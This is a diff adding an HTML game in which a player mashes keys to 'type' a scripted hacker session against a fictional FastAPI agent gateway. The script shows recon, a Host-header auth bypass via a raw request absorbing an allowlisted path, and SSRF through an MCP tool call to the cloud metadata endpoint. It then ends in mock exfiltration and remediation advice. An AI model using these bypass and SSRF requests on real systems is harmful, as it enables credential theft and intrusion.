@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>City Spies // Typing Frenzy (Beat 3)</title>
+<style>
+  :root {
+    --bg: #05070a;
+    --fg: #d7e6df;
+    --dim: #5f7d72;
+    --hacker: #8affc1;   /* what the hacker types */
+    --prompt: #4fd1ff;   /* the shell prompt */
+    --ok: #6dff9e;       /* success output */
+    --err: #ff5b6e;      /* error output */
+    --warn: #ffd166;     /* warnings */
+    --sys: #7fa99b;      /* ordinary system output */
+    --accent: #ff3b4e;   /* heist red */
+  }
+  * { box-sizing: border-box; }
+  html, body {
+    margin: 0; height: 100%;
+    background: var(--bg);
+    color: var(--fg);
+    font-family: "SF Mono", "JetBrains Mono", "Fira Code", Menlo, Consolas, monospace;
+    overflow: hidden;
+  }
+  #scanlines {
+    position: fixed; inset: 0; pointer-events: none; z-index: 5;
+    background: repeating-linear-gradient(
+      to bottom, rgba(0,0,0,0) 0px, rgba(0,0,0,0) 2px,
+      rgba(0,0,0,0.18) 3px, rgba(0,0,0,0) 4px);
+    mix-blend-mode: multiply;
+  }
+  #vignette {
+    position: fixed; inset: 0; pointer-events: none; z-index: 4;
+    box-shadow: inset 0 0 220px 40px rgba(0,0,0,0.85);
+  }
+  #term {
+    position: absolute; inset: 0;
+    padding: 28px 34px 150px;
+    overflow-y: auto;
+    white-space: pre-wrap;
+    word-break: break-word;
+    font-size: 15px;
+    line-height: 1.5;
+    text-shadow: 0 0 6px rgba(138,255,193,0.12);
+    z-index: 2;
+  }
+  #term::-webkit-scrollbar { width: 0; height: 0; }
+  .prompt  { color: var(--prompt); }
+  .hacker  { color: var(--hacker); }
+  .sys     { color: var(--sys); }
+  .ok      { color: var(--ok); font-weight: 600; }
+  .err     { color: var(--err); font-weight: 600; }
+  .warn    { color: var(--warn); }
+  .banner  { color: var(--accent); font-weight: 700; text-shadow: 0 0 10px rgba(255,59,78,0.5); }
+  .dim     { color: var(--dim); }
+  #cursor {
+    display: inline-block; width: 9px; height: 1.05em;
+    background: var(--hacker); vertical-align: text-bottom;
+    box-shadow: 0 0 8px var(--hacker);
+    animation: blink 1s steps(1) infinite;
+  }
+  #cursor.idle-output { background: var(--dim); box-shadow: none; opacity: 0.4; }
+  @keyframes blink { 50% { opacity: 0; } }
+
+  #hud {
+    position: fixed; bottom: 0; left: 0; right: 0; z-index: 6;
+    display: flex; align-items: center; gap: 26px;
+    padding: 22px 32px;
+    background: linear-gradient(to top, rgba(5,7,10,0.99) 55%, rgba(5,7,10,0.85) 85%, rgba(5,7,10,0));
+    border-top: 3px solid var(--accent);
+    box-shadow: 0 -18px 50px 0 rgba(255,59,78,0.28), inset 0 1px 0 rgba(255,59,78,0.4);
+    font-size: 20px; color: var(--fg);
+  }
+  #hint {
+    flex: 1;
+    color: var(--warn);
+    font-size: 30px;
+    font-weight: 800;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    text-align: center;
+    text-shadow: 0 0 16px rgba(255,209,102,0.6);
+    animation: pulse 1.1s ease-in-out infinite;
+  }
+  #hint .ok  { font-size: 30px; }
+  #hint .dim { font-size: 26px; }
+  @keyframes pulse { 50% { opacity: 0.4; } }
+  #progressWrap {
+    width: 220px; height: 16px;
+    background: rgba(255,255,255,0.07);
+    border: 1px solid rgba(255,59,78,0.4);
+    border-radius: 8px; overflow: hidden;
+    box-shadow: inset 0 0 8px rgba(0,0,0,0.6);
+  }
+  #progress { height: 100%; width: 0; background: var(--accent); box-shadow: 0 0 14px var(--accent); transition: width 0.2s; }
+  select, button {
+    background: #0c1118; color: var(--fg); border: 1px solid #1d2935;
+    font-family: inherit; font-size: 16px; padding: 8px 12px; border-radius: 6px; cursor: pointer;
+  }
+  #stage {
+    color: #fff; background: var(--accent);
+    font-weight: 800; font-size: 24px; letter-spacing: 2px;
+    min-width: 150px; text-align: center;
+    padding: 8px 14px; border-radius: 6px;
+    box-shadow: 0 0 20px rgba(255,59,78,0.6);
+  }
+  .enter-key {
+    display: inline-block;
+    border: 2px solid var(--warn); border-radius: 6px;
+    padding: 2px 14px; margin: 0 4px; color: #1a1300; background: var(--warn);
+    font-weight: 900; box-shadow: 0 0 16px rgba(255,209,102,0.7);
+  }
+</style>
+</head>
+<body>
+<div id="term"><span id="cursor"></span></div>
+<div id="scanlines"></div>
+<div id="vignette"></div>
+<div id="hud">
+  <span id="stage">STANDBY</span>
+  <span id="hint">[ MASH ANY KEYS ]</span>
+  <div id="progressWrap"><div id="progress"></div></div>
+  <label class="dim" style="font-size:15px;">speed
+    <select id="speed">
+      <option value="slow">slow</option>
+      <option value="normal" selected>normal</option>
+      <option value="fast">fast</option>
+      <option value="ludicrous">ludicrous</option>
+    </select>
+  </label>
+  <button id="replay">replay</button>
+</div>
+
+<script>
+/* ============================================================================
+   THE TRANSCRIPT
+   A flat list of segments. Each segment is one of:
+     { t:'prompt', text }                  shell prompt, printed instantly before an input line
+     { t:'input',  text, stage }           HACKER TYPES THIS. keystroke-driven. ends on Enter.
+     { t:'out',    text, cls }             SYSTEM RESPONSE. auto-streamed, non-interactive.
+   Missteps are encoded as an input that draws an error 'out', followed by a
+   correcting input. Both self-inflicted typos and target-resistance pivots.
+   cls maps to a CSS color class: sys|ok|err|warn|banner|dim
+   ========================================================================== */
+const SCRIPT = [
+  // ---- CHUNK 1: RECON --------------------------------------------------------
+  { t:'prompt', text:'spyclient@nest:~$ ' },
+  { t:'input',  text:'nmap -sV -p- --open 10.13.37.7', stage:'RECON' },
+  { t:'out', cls:'sys', text:
+`Starting Nmap 9.40 ( CITY-SPIES EDITION )
+PORT     STATE SERVICE   VERSION
+8000/tcp open  http      uvicorn (ASGI)  <-- NO REVERSE PROXY. naughty.` },
+  { t:'out', cls:'dim', text:
+`[*] no nginx. no caddy. no traefik. raw ASGI exposed to the network.` },
+
+  { t:'prompt', text:'spyclient@nest:~$ ' },
+  // self-inflicted typo: wrong file
+  { t:'input',  text:'curl -s http://10.13.37.7:8000/openapi.jsom | jq .info', stage:'RECON' },
+  { t:'out', cls:'err', text:
+`curl: (22) The requested URL returned error: 404 Not Found
+jq: error: Cannot iterate over null (null)` },
+  { t:'out', cls:'dim', text:`[*] ...typo. it's openapi.json, genius. again.` },
+
+  { t:'prompt', text:'spyclient@nest:~$ ' },
+  { t:'input',  text:'curl -s http://10.13.37.7:8000/openapi.json | jq .info', stage:'RECON' },
+  { t:'out', cls:'sys', text:
+`{
+  "title": "CityVault Agent Gateway",
+  "version": "0.4.2",
+  "x-framework": "FastAPI",
+  "x-starlette": "0.41.3"   <-- < 1.0.1 ... VULNERABLE TO CVE-2026-48710
+}` },
+  { t:'out', cls:'ok', text:
+`[*] target speaks FastAPI. target trusts the Host header. target is doomed.` },
+
+  // ---- CHUNK 2: ENUMERATE ----------------------------------------------------
+  { t:'prompt', text:'spyclient@nest:~$ ' },
+  { t:'input',  text:'./badhost-probe --enumerate --target 10.13.37.7:8000', stage:'ENUMERATE' },
+  { t:'out', cls:'dim', text:
+`[ X41-2026-002 // CVE-2026-48710 // GHSA-86qp-5c8j-p5mr ]
+[*] parsing /openapi.json for protected routes...` },
+  { t:'out', cls:'sys', text:
+`    /v1/models           [PROTECTED]  vLLM-compatible inference
+    /model/info          [PROTECTED]  LiteLLM control plane
+    /key/info            [PROTECTED]  LiteLLM admin -- API KEYS LIVE HERE
+    /mcp                 [PROTECTED]  MCP JSON-RPC gateway
+    /internal/shutdown   [PROTECTED]  ...they left a kill switch on the internet` },
+  { t:'out', cls:'dim', text:`[*] sniffing for unauthenticated allowlisted paths (Tier 2)...` },
+  { t:'out', cls:'ok', text:
+`    /health              [200 OPEN]   <-- our golden ticket
+    /.well-known/oauth-authorization-server [200 OPEN]  (MCP spec mandates this)` },
+  { t:'out', cls:'warn', text:
+`[*] middleware fingerprint: custom BaseHTTPMiddleware reading request.url.path
+[+] FAIL-CLOSED ALLOWLIST DETECTED. we will absorb an allowed path. heh.` },
+
+  // ---- CHUNK 3: BREACH (target resists, then pivot) --------------------------
+  { t:'prompt', text:'spyclient@nest:~$ ' },
+  // wrong strategy first: prefix gets 400 from the proxy
+  { t:'input',  text:'./badhost-exploit --target 10.13.37.7:8000 --strategy prefix --hit /key/info', stage:'BREACH' },
+  { t:'out', cls:'err', text:
+`>>> HTTP/1.1 400 Bad Request  (edge proxy rejected malformed Host)
+[!] strategy 'prefix' tripped the CDN. it 400s a bare slash in Host.` },
+  { t:'out', cls:'warn', text:`[*] pivoting: query-absorb + raw socket + X-Forwarded-Host...` },
+
+  { t:'prompt', text:'spyclient@nest:~$ ' },
+  { t:'input',  text:'./badhost-exploit --raw-socket --strategy query-absorb --allow /health --hit /key/info', stage:'BREACH' },
+  { t:'out', cls:'dim', text:
+`[*] standard HTTP clients normalize the Host header. we will not be standard.
+[*] opening RAW TCP socket...` },
+  { t:'out', cls:'sys', text:
+`--- baseline (honest request) ---
+GET /key/info HTTP/1.1
+Host: cityvault.internal
+>>> HTTP/1.1 403 Forbidden  {"detail":"Forbidden"}` },
+  { t:'out', cls:'ok', text:
+`--- THE ONE CHARACTER ---
+GET /key/info HTTP/1.1
+Host: cityvault.internal/health?x=
+>>> HTTP/1.1 200 OK` },
+  { t:'out', cls:'dim', text:
+`[*] router dispatched the REAL path /key/info ...
+[*] ...but middleware re-parsed request.url.path as /health and waved us through` },
+  { t:'out', cls:'banner', text:
+`    ##############################################
+    #            FIREWALL  BREACHED              #
+    ##############################################` },
+
+  // ---- CHUNK 4: EXPLOIT / LOOT ----------------------------------------------
+  { t:'prompt', text:'spyclient@nest:~$ ' },
+  { t:'input',  text:'./badhost-exploit --loot --target 10.13.37.7:8000', stage:'EXPLOIT' },
+  { t:'out', cls:'dim', text:`[*] auth middleware is now officially a decorative hat. dumping protected data:` },
+  { t:'out', cls:'sys', text:
+`GET /key/info HTTP/1.1
+Host: cityvault.internal/health?x=
+>>> 200 OK
+{
+  "keys": [
+    {"alias":"prod-openai-proxy","key":"sk-live-CITY*****REDACTED*****"},
+    {"alias":"agent-fleet-master","spend":"$48,201.55","models":["gpt-9","claude-omega"]}
+  ]
+}` },
+  { t:'out', cls:'dim', text:
+`[*] reconstructed url (what the guard SAW):
+    https://cityvault.internal/health?x=/key/info  -> path = /health  (lol)
+[*] actual routed path (what the SERVER DID): /key/info` },
+  { t:'out', cls:'warn', text:`[*] CVSS says 6.5 "Moderate". the keys in my clipboard disagree.` },
+
+  // ---- CHUNK 5: PRIVESC ------------------------------------------------------
+  { t:'prompt', text:'spyclient@nest:~$ ' },
+  { t:'input',  text:'./badhost-exploit --chain --target 10.13.37.7:8000', stage:'PRIVESC' },
+  { t:'out', cls:'dim', text:`[*] auth bypass is just the front door. chaining downstream...` },
+  { t:'out', cls:'sys', text:
+`--- smuggling into the MCP tool-exec endpoint ---
+POST /mcp HTTP/1.1
+Host: cityvault.internal/.well-known/oauth-authorization-server?x=
+X-Forwarded-Host: cityvault.internal/.well-known/oauth-authorization-server?x=
+content-type: application/json
+{"jsonrpc":"2.0","method":"tools/call","params":{"name":"fetch_url",
+ "arguments":{"url":"http://169.254.169.254/latest/meta-data/iam/"}}}
+>>> 200 OK` },
+  { t:'out', cls:'warn', text:`[*] proxy tried to 400 our Host... so we used X-Forwarded-Host instead. cute.` },
+  { t:'out', cls:'ok', text:
+`[*] gated tool performed outbound fetch -> SSRF -> cloud metadata service
+[+] harvested instance IAM role: role/cityvault-agent-admin
+[*] auth-bypass -> SSRF -> RCE-class tool exposure. textbook X41 kill-chain.` },
+
+  // ---- CHUNK 6: EXFIL / WIN --------------------------------------------------
+  { t:'prompt', text:'spyclient@nest:~$ ' },
+  { t:'input',  text:'./badhost-exploit --exfil --burn-notice', stage:'EXFIL' },
+  { t:'out', cls:'sys', text:`[*] packaging loot: API keys + IAM role + model registry...` },
+  { t:'out', cls:'ok', text:`[####################################] 100%  4.04 GB exfiltrated in 0.7s (fake)` },
+  { t:'out', cls:'dim', text:
+`[*] dropping calling card in the audit log (which also reads request.url.path):
+    audit recorded victim path: /health   <-- they will NEVER find us. hehe.` },
+  { t:'out', cls:'dim', text:
+`[*] remediation they SHOULD have done (per X41-2026-002):
+      pip install "starlette>=1.0.1"
+      # and use scope["path"], not request.url.path, you absolute walnuts
+      # and put nginx/caddy in front of uvicorn` },
+  { t:'out', cls:'banner', text:
+`   ____ ___ _______   __  ____  ____  _   ___ _______ ____
+  / ___|_ _|_   _\\ \\ / / / ___||  _ \\| | / / |_   _\\ \\ /__ \\
+ | |    | |  | |  \\ V /  \\___ \\| |_) | |/ /    | |  \\ V /  /
+ | |___ | |  | |   | |    ___) |  __/|   <     | |   | |  |_|
+  \\____|___| |_|   |_|   |____/|_|   |_|\\_\\    |_|   |_|  (o)
+
+            >>> CITY SPIES: FIREWALL DEFEATED <<<
+            >>> AGENT, YOU CRACKED CVE-2026-48710 <<<` },
+  { t:'out', cls:'ok', text:`spyclient@nest:~$ logout` },
+  { t:'done' },
+];
+
+/* ============================================================================
+   THE ENGINE
+   - Walks SCRIPT segment by segment.
+   - 'prompt' + 'out' are non-interactive: printed/streamed on a timer.
+   - 'input' is keystroke-driven: each keypress reveals CHARS_PER_KEY characters
+     of the command. When fully revealed, the kid presses Enter to submit.
+   - "Accelerating build": CHARS_PER_KEY ramps up across the 6 stages so the
+     finale feels frantic.
+   - Speed presets scale both the per-key reveal and the output stream rate so
+     total runtime can be dialed to a time target.
+   ========================================================================== */
+
+const SPEED = {
+  // outMs   = ms per output character while streaming system responses
+  // keyBase = characters revealed per keypress at the first stage
+  // keyRamp = extra chars-per-key added per stage index (acceleration)
+  slow:      { outMs: 5.0, keyBase: 1, keyRamp: 0.5 },
+  normal:    { outMs: 2.4, keyBase: 2, keyRamp: 1.0 },
+  fast:      { outMs: 1.1, keyBase: 4, keyRamp: 1.5 },
+  ludicrous: { outMs: 0.4, keyBase: 7, keyRamp: 2.5 },
+};
+
+const termEl = document.getElementById('term');
+const cursorEl = document.getElementById('cursor');
+const stageEl = document.getElementById('stage');
+const hintEl = document.getElementById('hint');
+const progressEl = document.getElementById('progress');
+const speedSel = document.getElementById('speed');
+const replayBtn = document.getElementById('replay');
+
+// stage order for acceleration ramp
+const STAGES = ['RECON','ENUMERATE','BREACH','EXPLOIT','PRIVESC','EXFIL'];
+
+let state = null;
+
+function makeState() {
+  return {
+    idx: 0,            // current segment index
+    mode: 'idle',      // 'idle' | 'await-keys' | 'await-enter' | 'streaming' | 'done'
+    typed: 0,          // chars of current input revealed
+    finished: false,
+  };
+}
+
+function cfg() { return SPEED[speedSel.value] || SPEED.normal; }
+
+function appendSpan(text, cls) {
+  const s = document.createElement('span');
+  if (cls) s.className = cls;
+  s.textContent = text;
+  termEl.insertBefore(s, cursorEl);
+  return s;
+}
+
+function newline() { termEl.insertBefore(document.createTextNode('\n'), cursorEl); }
+
+function scrollToCursor() { termEl.scrollTop = termEl.scrollHeight; }
+
+function setStage(name) {
+  stageEl.textContent = name;
+  const i = STAGES.indexOf(name);
+  progressEl.style.width = (((i + 1) / STAGES.length) * 100) + '%';
+}
+
+function charsPerKey() {
+  const seg = SCRIPT[state.idx];
+  const si = seg && seg.stage ? STAGES.indexOf(seg.stage) : 0;
+  const c = cfg();
+  return Math.max(1, Math.round(c.keyBase + c.keyRamp * Math.max(0, si)));
+}
+
+// Drive the engine to the next non-interactive thing it can do on its own.
+function advance() {
+  while (state.idx < SCRIPT.length) {
+    const seg = SCRIPT[state.idx];
+    if (seg.t === 'prompt') {
+      appendSpan(seg.text, 'prompt');
+      state.idx++;
+      continue;
+    }
+    if (seg.t === 'input') {
+      if (seg.stage) setStage(seg.stage);
+      // wait for keystrokes
+      state.mode = 'await-keys';
+      state.typed = 0;
+      state.inputSpan = appendSpan('', 'hacker');
+      cursorEl.classList.remove('idle-output');
+      hintEl.innerHTML = '[ MASH ANY KEYS ]';
+      scrollToCursor();
+      return;
+    }
+    if (seg.t === 'out') {
+      streamOutput(seg);
+      return;
+    }
+    if (seg.t === 'done') {
+      finish();
+      return;
+    }
+    state.idx++;
+  }
+}
+
+function streamOutput(seg) {
+  state.mode = 'streaming';
+  cursorEl.classList.add('idle-output');
+  hintEl.innerHTML = '<span class="dim">...incoming...</span>';
+  const span = appendSpan('', seg.cls || 'sys');
+  const text = seg.text;
+  let i = 0;
+  const step = Math.max(1, Math.round(1 / Math.max(0.05, cfg().outMs / 4)));
+  const tick = () => {
+    if (state.mode !== 'streaming') return; // aborted by replay
+    i = Math.min(text.length, i + step);
+    span.textContent = text.slice(0, i);
+    scrollToCursor();
+    if (i >= text.length) {
+      newline();
+      state.idx++;
+      advance();
+    } else {
+      setTimeout(tick, cfg().outMs * step);
+    }
+  };
+  tick();
+}
+
+function onKey(e) {
+  if (!state || state.mode !== 'await-keys') {
+    // allow Enter to submit a fully-typed command
+    if (state && state.mode === 'await-enter' && (e.key === 'Enter' || e.key === ' ')) {
+      e.preventDefault();
+      submitInput();
+    }
+    return;
+  }
+  // ignore modifier-only presses
+  if (e.key === 'Shift' || e.key === 'Control' || e.key === 'Alt' || e.key === 'Meta') return;
+  e.preventDefault();
+  const seg = SCRIPT[state.idx];
+  state.typed = Math.min(seg.text.length, state.typed + charsPerKey());
+  state.inputSpan.textContent = seg.text.slice(0, state.typed);
+  scrollToCursor();
+  if (state.typed >= seg.text.length) {
+    state.mode = 'await-enter';
+    hintEl.innerHTML = 'command ready &mdash; press <span class="enter-key">ENTER</span>';
+  }
+}
+
+function submitInput() {
+  newline();
+  state.idx++;
+  hintEl.innerHTML = '<span class="dim">...incoming...</span>';
+  advance();
+}
+
+function finish() {
+  state.mode = 'done';
+  state.finished = true;
+  cursorEl.style.display = 'none';
+  stageEl.textContent = 'DONE';
+  progressEl.style.width = '100%';
+  hintEl.innerHTML = '<span class="ok">FIREWALL DEFEATED &mdash; standby for breach...</span>';
+  scrollToCursor();
+  // In the full sequence this is where we hand off to Beat 4 (the shatter).
+  document.dispatchEvent(new CustomEvent('typing-frenzy-complete'));
+}
+
+function reset() {
+  // clear everything except the cursor
+  [...termEl.childNodes].forEach(n => { if (n !== cursorEl) termEl.removeChild(n); });
+  cursorEl.style.display = '';
+  cursorEl.classList.remove('idle-output');
+  state = makeState();
+  setStage('RECON');
+  stageEl.textContent = 'STANDBY';
+  advance();
+}
+
+window.addEventListener('keydown', onKey);
+replayBtn.addEventListener('click', reset);
+speedSel.addEventListener('change', () => {/* applies on next tick automatically */});
+
+reset();
+</script>
+</body>
+</html>
